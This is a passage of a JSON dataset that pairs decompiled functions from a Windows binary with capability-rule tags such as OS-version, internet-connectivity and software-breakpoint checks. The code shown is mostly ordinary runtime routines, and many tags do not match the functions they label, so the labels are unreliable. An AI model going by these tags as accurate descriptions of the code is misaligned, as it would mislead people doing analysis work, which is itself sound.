        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040fcd9(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004092b4(0x418510, 0x10);\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    if (*(iVar1 + 4) < 0x81) {\n        iVar5 = *(iVar2 + 8);\n    }\n    else {\n        iVar5 = *(iVar2 + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar3 = fcn.0040a925();\n    *(iVar3 + 0x90) = *(iVar3 + 0x90) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar1 + 4) <= iVar5)) {\n            fcn.0040f1e9();\n        }\n        iVar3 = iVar5 * 8;\n        piVar4 = *(iVar1 + 8) + iVar3;\n        iVar5 = *piVar4;\n        *(unaff_EBP + -0x20) = iVar5;\n        *(unaff_EBP + -4) = 1;\n        if (piVar4[1] != 0) {\n            *(iVar2 + 8) = iVar5;\n            fcn.004108a0(*(*(iVar1 + 8) + 4 + iVar3), iVar2, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar5;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040fd9f();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.0040f1e9();\n    }\n    *(iVar2 + 8) = iVar5;\n    fcn.004092f9();\n    return;\n}\n",
        "token_count": 572
    },
    "0040fd9f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040fd9f(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040a925();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.0040a925();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "00410067": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410067(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.00407bc9(*(unaff_EBP + -0x28));\n    iVar1 = fcn.0040a925();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.0040a925();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.00407ba2(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.0040fdff(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 381
    },
    "00411003": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00411003(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.0040a6d0();\n    var_4h = 0;\n    if (*0x5cb3d0 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x401e14);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x401e08);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x5cb3d0 = fcn.0040a65e(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x401df8);\n        *0x5cb3d4 = fcn.0040a65e(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x401de4);\n        *0x5cb3d8 = fcn.0040a65e(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x401dc8);\n        *0x5cb3e0 = fcn.0040a65e(uVar3);\n        if (*0x5cb3e0 != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x401db0);\n            *0x5cb3dc = fcn.0040a65e(uVar3);\n        }\n    }\n    if ((*0x5cb3dc != iVar1) && (*0x5cb3e0 != iVar1)) {\n        pcVar4 = fcn.0040a6d9(*0x5cb3dc);\n        pcVar5 = fcn.0040a6d9(*0x5cb3e0);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x00411145;\n        }\n    }\n    if ((((*0x5cb3d4 != iVar1) && (pcVar4 = fcn.0040a6d9(*0x5cb3d4),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x5cb3d8 != iVar1 && (pcVar4 = fcn.0040a6d9(*0x5cb3d8),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x00411145:\n    pcVar4 = fcn.0040a6d9(*0x5cb3d0);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 872
    },
    "0041598e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041598e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41ac70 ^ &stack0xfffffffc;\n    fcn.00406a30(arg_10h);\n    var_14h = fcn.00416979(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00415ef1(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x004159e7:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00415a27;\n        }\n        if (iVar1 != 2) {\ncode_r0x00415a19:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00415a27;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00415a19;\n        goto code_r0x004159e7;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00415a27:\n    fcn.00407c7b(unaff_EBX);\n    return;\n}\n",
        "token_count": 503
    },
    "00415a36": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00415a36(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41ac70 ^ &stack0xfffffffc;\n    fcn.00406a30(arg_10h);\n    var_14h = fcn.00416979(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00416435(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x00415a8f:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00415acf;\n        }\n        if (iVar1 != 2) {\ncode_r0x00415ac1:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00415acf;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00415ac1;\n        goto code_r0x00415a8f;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00415acf:\n    fcn.00407c7b(unaff_EBX);\n    return;\n}\n",
        "token_count": 501
    },
    "00415ef1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00415ef1(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x004163f2;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x00416026;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0041602d;\ncode_r0x00416026:\n                        do {\n                            var_4h = 1;\ncode_r0x0041602d:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0041603b;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0041603b:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x41b1d4 - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x41b1d4 < iVar12) {\n                if (iVar12 < *0x41b1d0) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x41b1d0;\n                    uVar5 = 1;\n                }\n                goto code_r0x004163f2;\n            }\n            var_10h = *0x41b1d4 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x004161de;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x004161de:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x004163f2:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3670
    },
    "00416435": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00416435(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x00416936;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x41b1f0 - 1;\n        iVar4 = *0x41b1f0 + (*0x41b1f0 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x41b1f0 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0041656a;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x00416571;\ncode_r0x0041656a:\n                        do {\n                            var_4h = 1;\ncode_r0x00416571:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0041657f;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0041657f:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x41b1ec - *0x41b1f0) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x41b1ec < iVar12) {\n                if (iVar12 < *0x41b1e8) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x41b1fc;\n                    iVar4 = *0x41b1f4 + (*0x41b1f4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x41b1f4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x41b1f4 + (*0x41b1f4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x41b1f4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x41b1fc + *0x41b1e8;\n                    uVar5 = 1;\n                }\n                goto code_r0x00416936;\n            }\n            var_10h = *0x41b1ec - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x41b1f0 - 1;\n            iVar12 = *0x41b1f0 + (*0x41b1f0 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x41b1f0 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x00416722;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                